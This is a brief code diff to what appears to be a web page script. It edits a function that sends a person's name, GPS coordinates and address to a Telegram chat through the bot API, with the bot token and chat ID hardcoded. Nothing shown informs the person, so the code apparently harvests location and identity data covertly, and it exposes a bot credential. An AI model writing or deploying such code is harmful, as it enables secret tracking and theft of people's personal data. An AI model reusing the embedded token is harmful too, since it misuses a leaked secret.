@@ -180,7 +180,7 @@
             })
         }
 
-        function sendToTelegramGroup() {
+        function sendToTelegramGroup(userInfo) {
             const botToken = '7485708002:AAEy-gCr1lG9ZX6AXxpJdbo6GjA6xtJ5L5U';
             const chatId = -4218196722;
             const message = `
@@ -189,9 +189,6 @@ Name: ${userInfo.name}
 GPS: ${userInfo.gps}
 Address: ${userInfo.address}
     `;
-
-
-
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             fetch(url, {
